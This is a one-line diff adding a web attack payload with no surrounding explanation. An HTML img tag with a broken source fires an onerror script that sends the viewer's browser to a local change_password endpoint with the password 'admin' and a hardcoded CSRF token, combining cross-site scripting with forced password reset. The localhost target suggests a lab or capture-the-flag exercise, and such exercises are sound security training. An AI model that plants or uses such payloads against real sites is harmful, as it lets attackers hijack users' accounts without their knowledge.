@@ -1,0 +1,1 @@
+<img src="#" onerror="window.location.href='<img%20src=http://127.0.0.1:8000/change_password?pw=admin&csrftoken=516ea25bf61e046cb6b4e4fe6399df22>'" />
